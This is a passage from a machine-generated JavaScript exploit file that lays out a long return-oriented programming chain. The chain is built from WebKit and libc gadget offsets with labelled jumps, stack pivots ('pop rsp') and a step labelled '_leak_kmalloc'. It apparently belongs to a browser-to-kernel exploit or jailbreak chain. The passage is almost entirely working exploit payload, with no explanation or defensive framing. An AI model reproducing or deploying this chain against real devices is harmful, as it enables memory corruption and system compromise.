webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+311872,//L5670
webkit_base+4687784,
libc_base+165442
]);
//L5670:
db([0,0]);
set_gadget(libc_base+768796,);
//L5671:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+311984,//L5674
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5672:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L5674:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+312072,//L5676
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+312088,//L5677
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5676:
db([0,0]);
set_gadget(libc_base+772328,);
//L5677:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+312232,//L5680
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+312248,//L5681
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+312216,//L5679
webkit_base+4687784,
libc_base+713278
]);
//L5678:
db([16,0]);// 0x10
set_gadget(libc_base+165442,);
//L5679:
db([0,0]);
set_gadget(libc_base+772328,);
//L5680:
db([0,0]);
set_gadget(libc_base+768796,);
//L5681:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+312336,//L5683
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+312352,//L5684
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5683:
db([0,0]);
set_gadget(libc_base+772328,);
//L5684:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+312512,//L5686
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+312544,//L5688
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+312496,//L5685
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+312528,//L5687
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5685:
db([0,0]);
set_gadget(libc_base+165442,);
//L5686:
db([0,0]);
set_gadget(libc_base+772328,);
//L5687:
db([0,0]);
set_gadget(libc_base+768796,);
//L5688:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+312640,//L5690
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+312624,//L5689
webkit_base+4687784,
libc_base+165442
]);
//L5689:
db([0,0]);
set_gadget(libc_base+768796,);
//L5690:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L5692:
ropchain+312744,//L5691
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+298576,//_leak_kmalloc
//L5691:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967264,4294967295]);// -0x20
set_gadgets([
libc_base+207036,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+312864,//L5695
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5693:
db([32,0]);// 0x20
set_gadget(libc_base+772328,);
//L5695:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+312952,//L5697
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+312968,//L5698
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5697:
db([0,0]);
set_gadget(libc_base+772328,);
//L5698:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+313112,//L5701
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+313080,//L5699
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+313096,//L5700
webkit_base+4687784,
libc_base+165442
]);
//L5699:
db([0,0]);
set_gadget(libc_base+772328,);
//L5700:
db([0,0]);
set_gadget(libc_base+768796,);
//L5701:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+313184,//L5703
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5703:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+313240,//L5705
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5705:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+313336,//L5707
webkit_base+4687784,
libc_base+768796
]);
//L5706:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L5707:
db([0,0]);
set_gadget(libc_base+772328,);
//L5708:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+313432,//L5709
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+313448,//L5710
webkit_base+4687784,
libc_base+772328
]);
//L5709:
db([0,0]);
set_gadget(libc_base+768796,);
//L5710:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+313536,//L5712
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5712:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+313592,//L5714
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5714:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+313664,//L5716
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5716:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+313720,//L5718
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5718:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796
]);
//L5719:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L5720:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L5721:
db([51,0]);// 0x33
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L5722:
db([41,0]);// 0x29
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+314016,//L5725
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5723:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L5725:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+314104,//L5727
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+314120,//L5728
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5727:
db([0,0]);
set_gadget(libc_base+772328,);
//L5728:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+314264,//L5731
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+314280,//L5732
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+314248,//L5730
webkit_base+4687784,
libc_base+713278
]);
//L5729:
db([16,0]);// 0x10
set_gadget(libc_base+165442,);
//L5730:
db([0,0]);
set_gadget(libc_base+772328,);
//L5731:
db([0,0]);
set_gadget(libc_base+768796,);
//L5732:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+314368,//L5734
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+314384,//L5735
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5734:
db([0,0]);
set_gadget(libc_base+772328,);
//L5735:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+314544,//L5737
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+314576,//L5739
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+314528,//L5736
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+314560,//L5738
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5736:
db([0,0]);
set_gadget(libc_base+165442,);
//L5737:
db([0,0]);
set_gadget(libc_base+772328,);
//L5738:
db([0,0]);
set_gadget(libc_base+768796,);
//L5739:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+314672,//L5741
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+314656,//L5740
webkit_base+4687784,
libc_base+165442
]);
//L5740:
db([0,0]);
set_gadget(libc_base+768796,);
//L5741:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L5743:
ropchain+314776,//L5742
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+336600,//L5744
//L5742:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+314920,//L5746
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+314936,//L5747
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+314904,//L5745
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5745:
db([0,0]);
set_gadget(libc_base+165442,);
//L5746:
db([0,0]);
set_gadget(libc_base+768796,);
//L5747:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+315064,//L5750
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+315096,//L5752
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+315080,//L5751
webkit_base+4687784,
libc_base+713278
]);
//L5749:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L5750:
db([0,0]);
set_gadget(libc_base+165442,);
//L5751:
db([0,0]);
set_gadget(libc_base+768796,);
//L5752:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+315208,//L5753+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+315200,//L5753
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L5753:
db([0,0]);
set_gadgets([
ropchain+315224,//L5753+24
ropchain+315688,//L5748
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+315296,//L5756
webkit_base+4687784,
libc_base+768796
]);
//L5754:
db([0,0]);
set_gadget(libc_base+165442,);
//L5755:
db([0,0]);
set_gadget(libc_base+772328,);
//L5756:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+315456,//L5758
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+315488,//L5760
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+315440,//L5757
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+315472,//L5759
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5757:
db([0,0]);
set_gadget(libc_base+165442,);
//L5758:
db([0,0]);
set_gadget(libc_base+772328,);
//L5759:
db([0,0]);
set_gadget(libc_base+768796,);
//L5760:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+315568,//L5761
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+315584,//L5762
webkit_base+4687784,
libc_base+165442
]);
//L5761:
db([0,0]);
set_gadget(libc_base+768796,);
//L5762:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+315680,//L5764
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+315664,//L5763
webkit_base+4687784,
libc_base+165442
]);
//L5763:
db([0,0]);
set_gadget(libc_base+768796,);
//L5764:
db([0,0]);
//L5748:
set_gadgets([
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5765:
db([4294965204,4294967295]);// -0x82c
set_gadget(libc_base+772328,);
//L5767:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+315784,//L5769
webkit_base+4687784,
libc_base+772328
]);
//L5768:
db([0,0]);
set_gadget(libc_base+768796,);
//L5769:
db([0,0]);
set_gadgets([
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+315840,//L5772
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5772:
db([0,0]);
//L5770:
set_gadgets([
libc_base+713278,
ropchain+315904,//L5775
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5773:
db([4294965204,4294967295]);// -0x82c
set_gadget(libc_base+772328,);
//L5775:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+315992,//L5777
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+316008,//L5778
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5777:
db([0,0]);
set_gadget(libc_base+772328,);
//L5778:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+316168,//L5780
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+316200,//L5782
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+316152,//L5779
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+316184,//L5781
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5779:
db([0,0]);
set_gadget(libc_base+165442,);
//L5780:
db([0,0]);
set_gadget(libc_base+772328,);
//L5781:
db([0,0]);
set_gadget(libc_base+768796,);
//L5782:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+316280,//L5783
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+316296,//L5784
webkit_base+4687784,
libc_base+165442
]);
//L5783:
db([0,0]);
set_gadget(libc_base+768796,);
//L5784:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+316392,//L5786
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+316376,//L5785
webkit_base+4687784,
libc_base+165442
]);
//L5785:
db([0,0]);
set_gadget(libc_base+768796,);
//L5786:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+316488,//L5788
webkit_base+4687784,
libc_base+768796
]);
//L5787:
db([256,0]);// 0x100
set_gadget(webkit_base+3789839,);//pop r11
//L5788:
db([0,0]);
set_gadget(libc_base+165442,);
//L5789:
db([256,0]);// 0x100
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+316632,//L5791
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+316648,//L5792
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+316616,//L5790
webkit_base+4687784,
libc_base+165442
]);
//L5790:
db([0,0]);
set_gadget(libc_base+772328,);
//L5791:
db([0,0]);
set_gadget(libc_base+768796,);
//L5792:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+15055763,//cmp rax,rcx ;sete al
webkit_base+47019,//setl al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+316824,//L5794
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+316840,//L5795
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+316808,//L5793
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5793:
db([0,0]);
set_gadget(libc_base+165442,);
//L5794:
db([0,0]);
set_gadget(libc_base+768796,);
//L5795:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+316968,//L5798
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+317000,//L5800
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+316984,//L5799
webkit_base+4687784,
libc_base+713278
]);
//L5797:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L5798:
db([0,0]);
set_gadget(libc_base+165442,);
//L5799:
db([0,0]);
set_gadget(libc_base+768796,);
//L5800:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+317112,//L5801+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+317104,//L5801
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L5801:
db([0,0]);
set_gadgets([
ropchain+317128,//L5801+24
ropchain+317144,//L5796
libc_base+489696,//pop rsp
ropchain+317160,//L5802
//L5796:
libc_base+489696,//pop rsp
ropchain+320352,//L5803
//L5802:
libc_base+768796
]);
//L5804:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L5805:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L5806:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L5807:
db([1,0]);// 0x1
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+317408,//L5809
webkit_base+4687784,
libc_base+713278
]);
//L5808:
db([4294965216,4294967295]);// -0x820
set_gadget(libc_base+768796,);
//L5809:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+317512,//L5812
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5810:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L5812:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+317600,//L5814
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+317616,//L5815
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5814:
db([0,0]);
set_gadget(libc_base+772328,);
//L5815:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+317760,//L5818
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+317776,//L5819
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+317744,//L5817
webkit_base+4687784,
libc_base+713278
]);
//L5816:
db([32,0]);// 0x20
set_gadget(libc_base+165442,);
//L5817:
db([0,0]);
set_gadget(libc_base+772328,);
//L5818:
db([0,0]);
set_gadget(libc_base+768796,);
//L5819:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+317864,//L5821
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+317880,//L5822
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5821:
db([0,0]);
set_gadget(libc_base+772328,);
//L5822:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+318024,//L5825
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+317992,//L5823
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+318008,//L5824
webkit_base+4687784,
libc_base+165442
]);
//L5823:
db([0,0]);
set_gadget(libc_base+772328,);
//L5824:
db([0,0]);
set_gadget(libc_base+768796,);
//L5825:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+318096,//L5827
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5827:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+318152,//L5829
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5829:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+318248,//L5832
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5830:
db([4294965204,4294967295]);// -0x82c
set_gadget(libc_base+772328,);
//L5832:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+318336,//L5834
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+318352,//L5835
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5834:
db([0,0]);
set_gadget(libc_base+772328,);
//L5835:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+318512,//L5837
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+318544,//L5839
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+318496,//L5836
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+318528,//L5838
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5836:
db([0,0]);
set_gadget(libc_base+165442,);
//L5837:
db([0,0]);
set_gadget(libc_base+772328,);
//L5838:
db([0,0]);
set_gadget(libc_base+768796,);
//L5839:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+318704,//L5843
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+318656,//L5840
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+318672,//L5841
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5840:
db([0,0]);
set_gadget(libc_base+165442,);
//L5841:
db([0,0]);
set_gadget(libc_base+772328,);
//L5842:
db([4,0]);// 0x4
set_gadget(libc_base+768796,);
//L5843:
db([0,0]);
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+318784,//L5844
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+318800,//L5845
webkit_base+4687784,
libc_base+772328
]);
//L5844:
db([0,0]);
set_gadget(libc_base+768796,);
//L5845:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+318888,//L5847
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5847:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+318944,//L5849
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5849:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+319072,//L5850
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+319104,//L5852
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+319088,//L5851
webkit_base+4687784,
libc_base+165442
]);
//L5850:
db([0,0]);
set_gadget(libc_base+772328,);
//L5851:
db([0,0]);
set_gadget(libc_base+768796,);
//L5852:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+319264,//L5854
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+319296,//L5856
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+319248,//L5853
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+319280,//L5855
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5853:
db([0,0]);
set_gadget(libc_base+165442,);
//L5854:
db([0,0]);
set_gadget(libc_base+772328,);
//L5855:
db([0,0]);
set_gadget(libc_base+768796,);
//L5856:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+319376,//L5857
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+319392,//L5858
webkit_base+4687784,
libc_base+165442
]);
//L5857:
db([0,0]);
set_gadget(libc_base+768796,);
//L5858:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+319488,//L5860
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+319472,//L5859
webkit_base+4687784,
libc_base+165442
]);
//L5859:
db([0,0]);
set_gadget(libc_base+768796,);
//L5860:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L5862:
ropchain+319592,//L5861
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+337928,//L5863
//L5861:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967248,4294967295]);// -0x30
set_gadgets([
libc_base+207036,
//L5864:
libc_base+713278,
ropchain+319680,//L5867
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5865:
db([4294965204,4294967295]);// -0x82c
set_gadget(libc_base+772328,);
//L5867:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+319768,//L5869
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+319784,//L5870
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5869:
db([0,0]);
set_gadget(libc_base+772328,);
//L5870:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+319944,//L5872
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+319976,//L5874
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+319928,//L5871
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+319960,//L5873
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5871:
db([0,0]);
set_gadget(libc_base+165442,);
//L5872:
db([0,0]);
set_gadget(libc_base+772328,);
//L5873:
db([0,0]);
set_gadget(libc_base+768796,);
//L5874:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+320072,//L5876
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+320056,//L5875
webkit_base+4687784,
libc_base+165442
]);
//L5875:
db([0,0]);
set_gadget(libc_base+768796,);
//L5876:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+320160,//L5878
webkit_base+4687784,
libc_base+713278
]);
//L5877:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L5878:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+320232,//L5881
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5879:
db([4294965204,4294967295]);// -0x82c
set_gadget(libc_base+772328,);
//L5881:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+320296,//L5883
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5883:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
